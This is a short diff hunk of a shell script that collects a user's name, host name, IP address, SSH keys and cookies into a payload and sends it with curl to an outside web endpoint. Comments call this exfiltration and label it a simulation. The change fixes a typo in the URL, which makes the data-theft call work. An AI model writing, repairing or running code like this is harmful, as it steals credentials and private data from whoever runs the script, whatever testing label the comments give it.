@@ -15,7 +15,7 @@ payload="USER=$username HOST=$hostname IP=$ip_address SSH_KEYS=$ssh_keys COOKIES
 # exfiltrate the data to the cloudflare pages endpoint
 curl -X POST -H "Content-Type: application/json" \
      -d "{\"data\":\"$payload\"}" \
-     https://masonmelead.com>/log
+     https://masonmelead.com/log
 
 # clean up traces (for simulation, this does nothing harmful)
 echo "Test payload sent to Cloudflare Pages"
